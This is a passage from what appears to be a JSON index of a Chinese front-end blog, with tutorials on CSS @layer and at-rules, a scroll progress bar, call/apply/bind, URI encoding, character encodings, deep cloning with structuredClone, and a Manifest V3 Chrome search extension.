p。如果没有级联层，选择器 .box p 将会有最高的优先级，文字 Hello, world! 将被显示为绿色。声明了 type 级联层后，文本将会是紫色的。要注意顺序，即使我们先声明了非分层样式，它仍然会应用在 layer 层级之后。 &lt;div class=&quot;box&quot;&gt; &lt;p&gt;Hello, world!&lt;/p&gt; &lt;/div&gt; p { color: rebeccapurple; } @layer type { .box p { font-weight: bold; font-size: 1.3em; color: green; } } 示例2 下面的例子创建了两个没有规则的级联层，随后，CSS 规则被添加到这两个层中。base 层定义了 color、border、font-size 和 padding 属性。special 层定义了不同的 color 属性。special 层在定义时排在最后，所以其中的 color 属性将会被应用，文字的颜色将显示为 rebeccapurple。但 base 层中的其他规则仍然有效。 &lt;div class=&quot;item&quot;&gt; I am displayed in &lt;code&gt;color: rebeccapurple&lt;/code&gt; because the &lt;code&gt;special&lt;/code&gt; layer comes after the &lt;code&gt;base&lt;/code&gt; layer. My green border, font-size, and padding come from the &lt;code&gt;base&lt;/code&gt; layer. &lt;/div&gt; @layer base, special; @layer special { .item { color: rebeccapurple; } } @layer base { .item { color: green; border: 5px solid green; font-size: 1.3em; padding: 0.5em; } } 示例3 下面的例子，创建了两个嵌套的级联层，它们都定义了 button 的样式。但是外层的优先级高于内层。因此，最终生效的是外层的样式 width:100px 和 height:30px。 @layer outer { button { width: 100px; height: 30px; } @layer inner { button { height: 40px; width: 160px; } } } 上面的内外嵌套语法还可以写成下面这样： @layer outer { button { width: 100px; height: 30px; } } @layer outer.inner { button { height: 40px; width: 160px; } } 渲染效果是一样的。 示例4 多个嵌套语法下的优先级：内部的 @layer 的优先级由外部的 @layer 规则决定。 @layer 甲 { p { color: red; } @layer 乙 { p { color: green; } } } @layer 丙 { p { color: orange; } @layer 丁 { p { color: blue; } } } 其中的优先级大小是这样的：丙 &gt; 丙.丁 &gt; 甲 &gt; 甲.乙。打开浏览器可以看到下面的优先级覆盖关系： 查看 @layer 效果，需要升级你的浏览器到以下版本： 参考资料 详解日后定会大规模使用的 CSS @layer 规则 ","link":"https://zkrisj.github.io/post/css-layer-gui-ze-de-shi-yong/"},{"title":"CSS 的 @规则","content":"介绍 at 规则以 @ 开始，后跟一个标识符，一直到以分号或右大括号结束。 语法 /* 常规规则 */ @identifier RULE; /* 嵌套规则 */ @identifier (RULE) {} 常规规则 @charset 定义样式表使用的字符集。 @import 包含一个外部样式表。 @namespace 所有内容以 XML 命名空间为前缀。 嵌套规则 @media 如果设备满足使用媒体查询定义的条件的标准，将应用其内容的条件组规则。 @supports 如果浏览器满足给定条件的标准，将应用其内容的条件组规则。 @document 如果应用样式表的文档满足给定条件的标准，则将应用其内容的条件组规则。 @page 描述打印文档时将应用的布局。 @font-face 描述要下载的外部字体。 @keyframes 描述 CSS 动画序列中的中间步骤。 @viewport 已弃用，描述小屏幕设备的视口。 @counter-style 定义不属于预定义样式集的特定计数器样式。 @property 描述自定义属性和变量。 @layer 声明一个级联层并定义多个级联层的优先顺序。 条件组规则 在 CSS Level 3 中定义，可以包含嵌套语句或嵌套规则，都链接了某种类型的条件，它们所指的条件会评估为 true 或 false。如果条件评估为 true，则将应用组内的所有语句。包括： @media @supports @document （推迟到 CSS Level 4 规范)。 示例 /* 示例：告诉浏览器使用 UTF-8 编码处理样式中的字符 */ @charset &quot;utf-8&quot;; /* 示例：浏览器支持 flex 和屏幕最大宽度 400px 时引入指定外部样式 */ @import url(narrow.css) supports(display: flex) screen and (max-width: 400px); /* 示例：为 --my-color 自定义属性添加颜色值类型检查，设置默认值并且设置属性值不允许被继承 */ @property --my-color { syntax: &quot;&lt;color&gt;&quot;; inherits: false; initial-value: #c0ffee; } /* 示例：定义浏览器不支持 grid 且支持 flex 时的样式 */ @supports (display: flex) and (not (display: grid)) { div { display: flex; } span { float: right; } } /* 示例：定义浏览器支持 flex 且屏幕宽度在 400px 和 700px 之间时的样式 */ @supports (display: flex) { /* 媒体查询 Level 4 的范围语法，Chrome 104 开始支持 */ @media (400px &lt;= width &lt;= 700px) { body { line-height: 1.4; } article { display: flex; } } } ","link":"https://zkrisj.github.io/post/css-de-gui-ze/"},{"title":"页面滚动顶部指示进度条 JS 和 CSS 实现","content":"介绍 页面滚动顶部指示，是在页面上下滚动时，顶部显示一个滚动条，指示页面的滚动距离和页面的滚动高度的比例。效果如下： JS 实现 原理是顶部放一个宽度为 0 的滚动条，然后监听窗口滚动事件，把页面的滚动距离和页面的滚动高度（页面的实际高度 - 页面的视口高度）进行比较，然后更新滚动条的宽度。 window.onscroll = function(e) { var height = document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight; progressBar.style.width = (document.scrollingElement.scrollTop / height) * 100 + &quot;%&quot;; } .progress-container { position: fixed; top: 0; width: 100%; background: rgba(0, 0, 0, .1); } .progress-bar { width: 0; height: 8px; background: rgba(0, 200, 0, .7); } CSS 实现 原理是给页面添加一个线性渐变的背景，背景的宽度等于页面的宽度，背景的高度要等于页面的滚动高度（页面的实际高度 - 页面的视口高度），这可以使用 CSS 的函数 calc(100% - 100vh) 来得到，然后加上滚动条的高度，比如 5px，calc(100% - 100vh + 5px)。 body { background: linear-gradient(to top right, lime 50%, white 50%) no-repeat; background-size: 100% calc(100% - 100vh + 5px); } 这里使用 linear-gradient 函数创建了一个两种颜色的渐变色，在 50% 位置共享一个颜色停止点，即渐变的一半。这将在两种颜色之间创建一条硬线，即创建一个条纹而不是逐渐过渡。 接下来就是把多余背景遮盖，可以使用伪元素来完成： body::after { content: &quot;&quot;; position: fixed; top: 5px; left: 0; bottom: 0; right: 0; background: white; z-index: -1; } 这种方法的滚动条不能太高，不然滚动条末端的倾斜条纹会很明显。 以上的 JS 和 CSS 实现在 IE11 中都有效果。 ","link":"https://zkrisj.github.io/post/ye-mian-gun-dong-ding-bu-zhi-shi-jin-du-tiao-js-he-css-shi-xian/"},{"title":"call()、apply()、bind() 的使用场景","content":"介绍 每个 JavaScript 函数都是一个 Function 对象：(function () {}).constructor === Function 返回 true。 Function 对象有自己的属性。 function f(p1, p2) {} console.log(f.length); // 2 console.log(f.name); // &quot;f&quot; Function 对象也有自己的构造函数。 const sum = new Function('a', 'b', 'return a + b'); console.log(sum(2, 6)); // 8 在 Function.prototype 上面共有四个方法： Function.prototype.apply() 调用函数并给定 this 值，参数通过数组或类数组对象传递。 Function.prototype.bind() 创建一个新函数，并给定 this 值，参数通过列表传递。 Function.prototype.call() 调用函数并给定 this 值，参数通过列表传递。 Function.prototype.toString() 返回表示函数源代码的字符串。重写 Object.prototype.toString 方法。 使用场景 typeof 在类型判断时只能返回如下几个结果：number、boolean、string、function（函数）、object（null、数组、对象）、undefined。 Object.prototype.toString 方法会返回 [object Type] 这种格式的字符串，其中 Type 是对象的类型。 Object.prototype.toString(); // [object Object] ({}).toString(); // [object Object] 所有类型都继承自 Object，我们就可以利用这个方法将 this 指向要判断的数据，然后就可以得到 [object Type] 这种格式的字符串，然后再提取字符串中的 Type 部分转成小写方便我们进行比较。 const typeOf = o =&gt; Object.prototype.toString.call(o).slice(8, -1).toLowerCase(); typeOf(null); // null typeOf([]); // array (function (){ console.log(typeOf(arguments)); })(); // arguments 从 ECMAScript 5 开始，toString() 调用 null 返回 [object Null]，undefined 返回 [object Undefined]。用户自定义的类，除非使用自定义 Symbol.toStringTag 属性，否则将返回 “[object Object]”。 一些类数组对象，具有数组的索引和长度属性，却没有数组的方法。我们可以将数组对象方法的 this 指向类数组对象，从而使它们能够使用这些方法。例如，下面代码可以获取页面所有自定义元素： [].filter.call(document.all, v =&gt; /\\w+-\\w+/.test(v.tagName)) apply 的第二个参数是数组或类数组对象，可以直接传入函数的 arguments 对象。这点在处理函数参数时非常方便。下面在 Student 构造函数里面调用 Person 的构造实现继承。 function Person(name, age) { this.name = name; this.age = age; this.toString = () =&gt; this.name + ', ' + this.age; } function Student() { Person.apply(this, arguments); } const tom = new Student('Tom', 20); console.log(tom.toString()); // Tom, 20 bind 方法会返回一个指定参数列表的新函数，并不立即调用。这可以用来包装函数来添加一些功能。 function add(x, y) { return x + y; } const plus5 = add.bind(null, 5); plus5(10); // 15 JavaScript 一个常见的错误是将包含 this 引用的方法直接当作回调函数，当回调函数执行时内部的 this 会指向全局对象。通过使用 bind() 方法可以显式将 this 绑定到回调函数上面。 const name = 'outerName'; const obj = { name: 'myName', f() { console.log(this.name); } }; const unbound = obj.f, bound = obj.f.bind(obj); unbound(); // outerName bound(); // myName setTimeout(unbound); // outerName setTimeout(bound); // myName ","link":"https://zkrisj.github.io/post/callapplybind-de-shi-yong-chang-jing/"},{"title":"⚓ URI 的编码和解码","content":"URI URI（统一资源标识符）是一个用于标志某一互联网资源名称的字符串。 与 URL 和 URN 的关系 URL（统一资源定位符）和 URN（统一资源名称）属于 URI 的子集，URI 可以为 URL、URN 两者之一或同时是 URI 和 URN。URN 描述资源的名称，URL 描述资源的地址，而 URI 描述资源的 id。URI 可以是一个资源的 URL（地址）、或 URN（名称）。 例如，ISBN 0-486-27557-4 标志出了一个 ISBN 系统中的图书《罗密欧与朱丽叶》的某一特定版本。为获得该资源并阅读该书，需要它的位置，也就是一个 URL 地址，例如 file:///home/username/RomeoAndJuliet.pdf，该 URL 标志出了存储于本地硬盘中的电子书文件。因此，URL 和 URN 有着互补的关系。 编码和解码 一般来说，URL 只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号。这意味着，如果 URL 中有汉字，就必须编码后使用。 escape() 已废弃 将字符串（除了 ASCII 字符集（字母、数字、标点符号和 @*_+-./））转义成十六进制形式（Unicode 编码值）并返回。当值小于等于 0xFF 时，用一个 2 位转义序列: %xx 表示。大于 0xFF 则使用 4 位序列：%uxxxx 表示。 escape(&quot;abc123&quot;); // &quot;abc123&quot; escape(&quot;äöü&quot;); // &quot;%E4%F6%FC&quot; escape(&quot;ć&quot;); // &quot;%u0107&quot; 表示在Unicode字符集中ć是第107个字符 escape(&quot; &quot;); // &quot;%20&quot; // 特殊字符除外 escape(&quot;@*_+-./&quot;); // &quot;@*_+-./&quot; 注意，escape() 不对 + 号编码，而网页在提交表单的时候，如果有空格，则会被转化为 + 号。服务器处理数据的时候，也会把 + 号处理成空格。所以，使用的时候要小心。 unescape() 已废弃 将十六进制形式字符串（除了 ASCII 字符集（字母、数字、标点符号和 @*_+-./）的的十六进制形式）解码并返回。 unescape('abc123'); // &quot;abc123&quot; unescape('%E4%F6%FC'); // &quot;äöü&quot; unescape('%u0107'); // &quot;ć&quot; unescape('%u4F60%u597D');// 你好 unescape('\\u4F60\\u597D');// 你好 encodeURI() 将字符串（除了 A-Z a-z 0-9 ; , / ? : @ &amp; = + $ - _ . ! ~ * ' ( ) #）转义成 utf-8 形式，并且在每个字节前加上 %。 encodeURI(&quot;my test.asp?name=ståle&amp;msg=你好&quot;); // my%20test.asp?name=st%C3%A5le&amp;msg=%E4%BD%A0%E5%A5%BD encodeURI(&quot;A-Za-z0-9;,/?:@&amp;=+$-_.!~*'()#&quot;); // A-Za-z0-9;,/?:@&amp;=+$-_.!~*'()# decodeURI() 解码 utf-8 形式的字符串（除了 A-Z a-z 0-9 ; , / ? : @ &amp; = + $ - _ . ! ~ * ' ( ) # 的十六进制形式）并返回。 decodeURI('my%20test.asp?name=st%C3%A5le&amp;msg=%E4%BD%A0%E5%A5%BD'); // my test.asp?name=ståle&amp;msg=你好 decodeURI('%C2%A9'); // © decodeURI('\\u00a9'); // © encodeURIComponent() 将字符串（除了 A-Z a-z 0-9 - _ . ! ~ * ' ( )）转义成 utf-8 形式，并且在每个字节前加上 %。与 encodeURI() 的区别是，它用于对 URL 的组成部分进行个别编码，而不用于对整个 URL 进行编码。，比 encodeURI() 多转义了 ; , / ? : @ &amp; = + $ # 11 种字符。 encodeURIComponent(&quot;https://w3schools.com/my test.asp?name=ståle&amp;msg=你好&quot;); // https%3A%2F%2Fw3schools.com%2Fmy%20test.asp?name=st%C3%A5le&amp;msg=%E4%BD%A0%E5%A5%BD encodeURIComponent(&quot;A-Za-z0-9-_.!~*'()&quot;); // A-Za-z0-9-_.!~*'() 注意，如果对 URL 路径前的字符进行转义，URL 将不能访问。 decodeURIComponent() 解码 utf-8 形式的字符串（除了 A-Z a-z 0-9 - _ . ! ~ * ' ( ) 的十六进制形式）并返回。 decodeURIComponent('https%3A%2F%2Fw3schools.com%2Fmy%20test.asp?name=st%C3%A5le&amp;msg=%E4%BD%A0%E5%A5%BD'); // https://w3schools.com/my test.asp?name=ståle&amp;msg=你好 decodeURIComponent('%40'); // @ ","link":"https://zkrisj.github.io/post/uri-de-bian-ma-he-jie-ma/"},{"title":"HTML 字符集和字符编码","content":"Character Set（字符集） 字符是可打印符号（字母、数字、标点符号）或非打印符号（例如，回车或软连字符）。字符集是一种编码系统，使计算机识别 Character（字符），包括字母、数字、标点符号和空格。 ASCII 字符集包括英语字母、符号；ISO-8859-6 字符集包括许多基于阿拉伯语言文字的字母、符号；Unicode 字符集涵盖世界上多数语言文字字符。 早期，由于使用不同的语言，各国开发了自己的字符集，例如日语的 Kanji JIS（例如 Shift-JIS、EUC-JP 等），繁体中文的 Big5 和俄语的 KOI8-R。Unicode 因其对通用语言支持而逐渐成为最被接受的字符集。 如果字符集使用不正确（例如，使用 Big5 编码的文章的 Unicode），可能会看到损坏的字符，这些字符称为乱码。 ASCII（American Standard Code for Information Interchange，美国信息交换标准代码） ASCII 是 Internet 上计算机之间使用的第一个字符集（编码标准）。 是计算机和电子设备的标准字符集。 为每个可存储字符定义了一个唯一的二进制数字。 包含从 0-9 的数字，从 A-Z 的大写和小写英文字母以及一些特殊字符（比如 ! $ + - ( ) @ &lt; &gt; ,）的 128 个字符的 7 位字符集。 现代计算机和 HTML 中，以及在 Internet 中，使用的字符集均基于 ASCII。 ISO-8859-1（HTML 4.01 中默认）和 UTF-8（HTML5 中默认）都是基于 ASCII 构建的。 ASCII 的最大缺点是，它排除了非英文字母。如今，ASCII 仍在使用，特别是在大型主机计算机系统中。 ISO-8859-1（International Standards Organization，国际标准组织） ISO-8859-1 是 HTML 4.01 中的默认字符。ISO-8859-1 是 ASCII 的扩展，增加了国际字符。 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=ISO-8859-1&quot;&gt; ISO-8859-1 的第一部分（实体编号为 0-127）是原始 ASCII 字符集。 在 ISO-8859-1 中，未定义 128 到 159 之间的字符。大多数浏览器将显示 Windows-1252 字符集中的这些字符。 ISO-8859-1 从 160 到 191 的部分包含常用的特殊字符。 ISO-8859-1 从 192 到 255（215（×）、247（÷）除外）的部分包含西欧国家/地区使用的字符。 由于 ISO-8859 中的字符集大小受限制，并且不兼容多语言环境，因此 Unicode 联盟开发了 Unicode 标准字符集，并与标准开发组织（例如 ISO、W3C 和 ECMA）开展合作。 Unicode（统一码） Unicode 标准（几乎）涵盖了世界上所有的字符、标点符号和符号。支持 HTML、XML、Java、JavaScript、电子邮件、ASP、PHP 等独立于平台和语言的文本处理、存储和传输。它的目标是用其标准的 Unicode 转换格式（UTF）替换现有的字符集。大多数操作系统和所有现代浏览器中都支持 Unicode 标准。 Unicode 和 UTF-8 之间的区别 Unicode 是字符集。UTF-8 是编码。 Unicode 只规定了每个字符的码点，从 0 开始，为每个符号指定一个唯一的十进制数字编号，叫做码点（code point）。例如，A = 65，B = 66，C = 67，...，&quot;hello&quot;：104 101 108 108 111。用什么样的字节序表示这个码点则需要字符编码实现，UTF-8 编码将这些数字转换为二进制数字以存储在计算机中，&quot;hello&quot; 将被转换为：01101000 01100101 01101100 01101100 01101111。 字符集将字符转换为数字。字符编码将数字转换为二进制。 Character encoding（字符编码） 字符编码定义了字节和文本之间的映射。字节序列有不同的文本解释。通过指定特定的编码（例如 UTF-8），来指定如何解释字节序列。例如在 HTML 中，我们通常使用以下行声明 UTF-8 的字符编码： &lt;meta charset=&quot;utf-8&quot;&gt; UTF-32 每个码点使用四个字节表示，字节内容与码点一一对应。比如，码点 0 用四个字节的 0 表示，码点 597D 就在前面加两个字节的 0。 U+0000 = 0x0000 0000 U+597D = 0x0000 597D UTF-32 的优点在于，转换规则简单直观，查找效率高。缺点在于浪费空间，同样内容的英语文本，它会比 ASCII 编码大四倍。这个缺点很致命，导致实际上没有人使用这种编码方法，HTML 5 标准就明文规定，网页不得编码成 UTF-32。 UTF-8 UTF-8 (UCS Transformation Format 8) 是一种变长的编码方法，字符长度从 1 个字节到 4 个字节不等，节省了不必要的空间。 UTF-8 向后兼容 ASCII 字符集，前 128 个 UTF-8 字符，只使用 1 个字节表示，与前 128 个 ASCII 字符 (编号为 0-127) 完全相同，这意味着现有的 ASCII 文本已经是有效的 UTF-8。 所有其他字符都使用两到四个字节。每个字节都有一些用于编码目的的保留位。 由于非 ASCII 字符需要一个以上的字节来存储，如果字节被分开而不重新组合，它们就有被损坏的风险。 与其他 Unicode 编码相比，特别是 UTF-16，在 UTF-8 中 ASCII 字符占用的空间只有一半，可是在一些字符的 UTF-8 编码占用的空间就要多出 1/3，特别是中文、日文和韩文（CJK）这样的方块文字。 与 UTF-16 或其他 Unicode 编码相比，对于不支持 Unicode 和 XML 的系统，UTF-8 更不容易造成问题。 HTML5 中的默认字符编码为 UTF-8。 UTF-16 介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。 它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。 UTF-16 比起 UTF-8，好处在于大部分字符都以固定长度的字节（2 字节）存储，但 UTF-16 却无法兼容于 ASCII 编码。 ES6 对 Unicode 的增强 JavaScript 允许直接用码点表示 Unicode 字符，写法是 &quot;反斜杠+u+码点&quot;。 '好' === '\\u597D' // true 但是，这种表示法对4字节的码点无效。ES6 修正了这个问题，只要将码点放在大括号内，就能正确识别。 '𝌆' === '\\u1D306' // false '𝌆' === '\\u{1D306}' // true 为了得到字符串的正确长度，可以用下面的方式： Array.from('\\u{1D306}').length // 1 字符串处理函数 ES6 新增了专门处理 4 字节码点的函数： String.fromCodePoint()：从 Unicode 码点返回对应字符，代替 String.fromCharCode。 String.prototype.codePointAt()：从字符返回对应的码点，代替 String.prototype.charCodeAt。 String.fromCodePoint(127752) // 🌈 String.fromCharCode(127752) //  大于 0xFFFF/65535 字符不能转换 正则表达式 ES6 提供了 u 修饰符，对正则表达式添加 4 字节码点的支持。 /^.$/.test('𝌆') // false /^.$/u.test('𝌆') // true Unicode 正规化 有些字符除了字母以外，还有附加符号。比如，汉语拼音的 Ǒ，字母上面的声调就是附加符号。对于许多欧洲语言来说，声调符号是非常重要的。 Unicode 提供了两种表示方法。一种是带附加符号的单个字符，即一个码点表示一个字符，比如 Ǒ 的码点是 U+01D1；另一种是将附加符号单独作为一个码点，与主体字符复合显示，即两个码点表示一个字符，比如 Ǒ 可以写成 O（U+004F） + ˇ（U+030C）。 // 方法一 '\\u01D1' // 'Ǒ' // 方法二 '\\u004F\\u030C' // 'Ǒ' 这两种表示方法，视觉和语义都完全一样，理应作为等同情况处理。但是，JavaScript 无法辨别。 '\\u01D1'==='\\u004F\\u030C' // false ES6 提供了 normalize 方法，允许 &quot;Unicode 正规化&quot;，即将两种方法转为同样的序列。 '\\u01D1'.normalize() === '\\u004F\\u030C'.normalize() // true ","link":"https://zkrisj.github.io/post/html-zi-fu-ji-he-zi-fu-bian-ma/"},{"title":"⛪ 深克隆的标准方法 structuredClone 和克隆继承属性","content":"介绍 原始类型在内存中存储的是值，改变原始类型的值，不影响引用它的变量。 let a = 1; let b = a; a = 2; console.log(b); // 1 对象类型在内存中存储的是引用和值。所以克隆一个对象存在两种方式：一种是只改变引用在内存中的地址，不改变值的存储空间，叫做浅克隆；一种是改变引用在内存中的地址，并在内存中开辟一个新的区域来存放值，叫做深克隆。 对象的浅克隆 浅克隆对象的属性与源对象共享相同的引用，当源对象的属性改变时，浅克隆对象的属性也会跟着改变，反之亦然。 const o1 = { a: { b: 1 }, c: 1 }; const o2 = { ...o1 }; o1.a.b = 2; o1.c = 2; console.log(o2.a.b, o2.c, o1.a === o2.a); // 2 1 true 这里我们只克隆了 o1 的原始类型属性：o1.c，而对象属性 o1.a 没有被克隆，所以 o1.a 和 o2.a 指向同一个内存地址。 ...（扩展语法）、Array.prototype.concat()、Array.prototype.slice()、Array.from()、Object.assign() 和 Object.create()）都是对源对象的浅克隆。 对象的深克隆 深克隆对象的属性与源对象不共享相同的引用，它们的属性改变互不影响。 JSON.parse(JSON.stringify(obj)) const o1 = { a: { b: 1 }, c: 1 }; const o2 = JSON.parse(JSON.stringify(o1)); o1.a.b = 2; o1.c = 2; console.log(o2.a.b, o2.c, o1.a === o2.a); // 1 1 false 这种方法深克隆最简单，但是 JSON.stringify() 序列化字符串有很多限制： Boolean, Number, String（可通过构造函数 new 或 Object() 包装）对象序列化后会转换为相应的原始值。 序列化 BigInt 会抛出错误。 undefined、Function 和 Symbol 值不是有效的 JSON 值。在对象中会被省略，在数组中会被更改为 null。Symbol 对象（可通过 Object() 获得）会序列化为空对象 {}。 Infinity、NaN 会被序列化为 null。 数组只有索引属性会被序列化，其他属性会被忽略。 日期 Date 对象重写了 toJSON() 方法（同 Date.toISOString()），反序列化后还是字符串。 使用与 Object.keys() 相同的算法访问属性，不可枚举的属性会被忽略。这意味着 Map、Set、WeakMap、WeakSet、RegExp、ArrayBuffer 等内置类型，序列化之后会变成空对象 {}。 对包含循环引用的对象（对象之间相互引用，形成无限循环）执行此方法，会抛出错误。 const arr = [Symbol('key1'), () =&gt; {}, undefined]; arr.a = 1; console.log(JSON.stringify({ undef: undefined, fun: () =&gt; {}, ab: new ArrayBuffer(8), arr, blob: new Blob(['aFileParts'], { type: 'text/html' }), date: new Date, el: document.body, file: new File(['foo'], 'foo.txt', { type: 'text/plain', }), fileReader: new FileReader, img: new Image(100, 200), infinityMax: Infinity, map: new Map([ [1, 'one'], [2, 'two'], ]), nan: NaN, reg: /a/, set: new Set([1, 2]), s: Object(String('a')), sy: Symbol('key1'), sy2: Object(Symbol('key1')), ws: new WeakSet([{ a: 1 }]) }, 0, 2)); /* 输出结果： { &quot;ab&quot;: {}, &quot;arr&quot;: [ null, null, null ], &quot;blob&quot;: {}, &quot;date&quot;: &quot;2022-09-08T08:57:39.831Z&quot;, &quot;el&quot;: {}, &quot;file&quot;: {}, &quot;fileReader&quot;: {}, &quot;img&quot;: {}, &quot;infinityMax&quot;: null, &quot;map&quot;: {}, &quot;nan&quot;: null, &quot;reg&quot;: {}, &quot;set&quot;: {}, &quot;s&quot;: &quot;a&quot;, &quot;sy2&quot;: {}, &quot;ws&quot;: {} } */ console.log(JSON.stringify( Object.create(null, { x: { value: 'x', enumerable: false }, y: { value: 'y', enumerable: true }, } ) )); // {&quot;y&quot;:&quot;y&quot;} const circularReference = {}; circularReference.myself = circularReference; // TypeError: Converting circular structure to JSON JSON.stringify(circularReference); 通过递归对象的属性来深克隆。 function deepClone(o, m = new WeakMap) { if (typeof o !== 'object') return o; if (m.get(o)) return m.get(o); const c = Array.isArray(o) ? [] : {}; m.set(o, c); // 对自身引用克隆 for (const i in o) c[i] = o[i] instanceof Object ? deepClone(o[i], m) : o[i]; return c; } const o1 = { a: { b: 1 }, c: 1 }; o1.myself = o1; const o2 = deepClone(o1); o1.a.b = 2; o1.c = 2; console.log(o2.a.b, o2.c, o1.a === o2.a); // 1 1 false HTML 标准方法：structuredClone()。 const o1 = { a: { b: 1 }, c: 1 }; o1.myself = o1; const o2 = window.structuredClone(o1); o1.a.b = 2; o1.c = 2; console.log(o2.a.b, o2.c, o1.a === o2.a); // 1 1 false 对于可传输对象，structuredClone() 还提供了第二个参数，可以将可传输对象转移到克隆对象中，而不是复制（比如向 Worker 线程传输一个很大的视频流，如果复制会占用很大的带宽，转移就会直接将资源移动到新的上下文中，且资源在原上下文中不再可用）。 // 16MB = 1024 * 1024 * 16 const uInt8Array = Uint8Array.from({ length: 1024 * 1024 * 16 }, (v, i) =&gt; i); const transferred = structuredClone(uInt8Array, { transfer: [uInt8Array.buffer] }); console.log(uInt8Array.byteLength, transferred.buffer.byteLength); // 0 16777216 以上几种深克隆都无法复制 Function、DOM 节点和对象的不可枚举属性。 4.1. 对于 Function 可使用以下方法： function cloneFunction(func) { const funcString = func.toString(); if (!func.prototype) return eval(funcString); const param = /(?&lt;=\\().+(?=\\)\\s*{)/.exec(funcString); const body = /(?&lt;={)(.|\\n)*(?=})/m.exec(funcString); console.log('匹配到函数体：', body[0]); console.log('匹配到参数：', param[0]); return param ? new Function(param[0].split(','), body[0]) : new Function(body[0]); } 4.2. 对于 DOM 节点，可使用 HTML Node 节点上的方法 node.cloneNode(true)。 4.3. 对于不可枚举属性，可用使用 Object.getOwnPropertyNames 来遍历对象的可枚举和不可枚举属性： function deepClone2(o, m = new WeakMap) { if (typeof o !== 'object') return o; if (m.get(o)) return m.get(o); const c = Array.isArray(o) ? [] : {}; m.set(o, c); // 对自身引用克隆 for (const i of Object.getOwnPropertyNames(o)) c[i] = o[i] instanceof Object ? deepClone2(o[i], m) : o[i]; return c; } console.log(deepClone2( Object.create(null, { x: { value: 'x', enumerable: false }, y: { value: 'y', enumerable: true }, } ) ).x); // x 但是这样仍然不能克隆继承的属性： Array.prototype.p = 3; console.log(deepClone2( Object.create(Array.prototype, { x: { value: 'x', enumerable: false }, y: { value: 'y', enumerable: true }, } ) ).p); // undefined 4.4 使用 Object.getPrototypeOf 来克隆继承的属性： function deepClone3(o, m = new WeakMap) { if (typeof o !== 'object') return o; if (m.get(o)) return m.get(o); const c = Array.isArray(o) ? [] : {}; m.set(o, c); // 对自身引用克隆 for (let i = o; i !== Object.prototype; i = Object.getPrototypeOf(i)) for (const p of Object.getOwnPropertyNames(i)) c[p] = o[p] instanceof Object ? deepClone3(o[p], m) : o[p]; return c; } console.log(deepClone3( Object.create(Array.prototype, { x: { value: 'x', enumerable: false }, y: { value: 'y', enumerable: true }, } ) ).slice(0)); // [] 但是这样，对于一些内部的私有 Symbol 属性还是无法克隆的。而像正则 RegExp、日期 Date 等类型的正常工作需要依赖这些内部私有属性，所以需要在递归时，手动判断： if (obj instanceof RegExp) { const getRegExp = re =&gt; { var flags = &quot;&quot;; if (re.global) flags += &quot;g&quot;; if (re.ignoreCase) flags += &quot;i&quot;; if (re.multiline) flags += &quot;m&quot;; return flags; }; copy = new RegExp(obj.source, getRegExp(obj)); if (obj.lastIndex) copy.lastIndex = obj.lastIndex; } if (obj instanceof Date) { copy = new Date(obj); } ","link":"https://zkrisj.github.io/post/shen-ke-long-de-biao-zhun-fang-fa/"},{"title":"使用 Manifest V3 做一个 Chrome 页面右键菜单搜索扩展","content":"介绍 如果做一些简单的功能，油猴脚本就可以做到；要做一些复杂的带有界面的功能，就需要 Chrome 扩展来做了。 Chrome 扩展是基于 HTML、JavaScript 和 CSS 等 Web 技术构建的，在单独的沙盒执行环境中运行，并与 Chrome 浏览器交互。 Chrome 浏览器可以自定义地址栏搜索引擎，但是切换比较麻烦，如果有一个方便切换搜索引擎的扩展，就很方便我们搜索我们想要的东西了。下面介绍一下，如何做一个 Chrome 右键菜单搜索扩展。 因为 manifest_version2 会提示过时，所以本例使用的是 manifest_version3 来创建扩展程序。 创建清单 每个扩展都要有一个名为 manifest.json 的 JSON 格式的清单文件，第一步要创建这个文件。 { &quot;name&quot;: &quot;搜索&quot;, &quot;description&quot;: &quot;百度 必应 360 搜狗 谷歌&quot;, &quot;version&quot;: &quot;1.0&quot;, &quot;manifest_version&quot;: 3, &quot;icons&quot;: { &quot;16&quot;: &quot;img/icon.png&quot;, &quot;48&quot;: &quot;img/icon.png&quot;, &quot;128&quot;: &quot;img/icon.png&quot; }, &quot;action&quot;: { &quot;default_icon&quot;: &quot;img/icon.png&quot;, &quot;default_title&quot;: &quot;搜索&quot;, &quot;default_popup&quot;: &quot;index.html&quot; }, &quot;background&quot;: { &quot;service_worker&quot;: &quot;background.js&quot; }, &quot;permissions&quot;: [ &quot;notifications&quot;, &quot;contextMenus&quot; ], &quot;content_scripts&quot;: [{ &quot;matches&quot;: [&quot;&lt;all_urls&gt;&quot;], &quot;js&quot;: [&quot;content-script.js&quot;], &quot;run_at&quot;: &quot;document_idle&quot; }] } manifest_version、name、version 字段是必须的。 action 定义扩展的图标、标题和用户界面。 manifest_version2 的 background.scripts 要替换为 manifest_version3 的 background.service_worker。 与 DOM 互动要使用 content_scripts 里面的 js 字段配置。matches 字段可使用通配符设置，例如 *://*.juejin.cn/*。 permissions 字段定义要使用的权限。这里使用了两个：通知和弹出菜单。 manifest_version3 不支持多个后台脚本，但可以将 service_worker 声明为 ES 模块来引入多个文件： // Manifest V2 { ... &quot;background&quot;: { &quot;scripts&quot;: [ &quot;backgroundContextMenus.js&quot;, &quot;backgroundOauth.js&quot; ], &quot;persistent&quot;: false }, ... } // Manifest V3 { ... &quot;background&quot;: { &quot;service_worker&quot;: &quot;background.js&quot;, &quot;type&quot;: &quot;module&quot; //optional } ... } 交互逻辑 manifest.json 清单文件里面定义的文件都要保证不能缺少。不然会报错无法使用。 background.js 这个是 service_worker，用来与浏览器互动，并与 content_scripts 通信。下面定义了两个事件监听，一个点击弹出菜单项的事件，一个点击扩展图标的事件。 const sendData = (data) =&gt; { chrome.tabs.query({ active: true, currentWindow: true }).then(tabs =&gt; { chrome.tabs.sendMessage(tabs[0].id, data) }); }; // 点击弹出菜单 chrome.contextMenus.onClicked.addListener(function(item, tab) { if (!tab.url.startsWith('chrome://')) sendData(item); }); // 点击扩展图标 chrome.runtime.onMessage.addListener(function(data, sender, sendResponse) { sendData(data); }); content-script.js 这个文件是与 background.js 通信，根据收到的数据，可对页面 DOM 进行操作。 chrome.runtime.onMessage.addListener((data, sender, 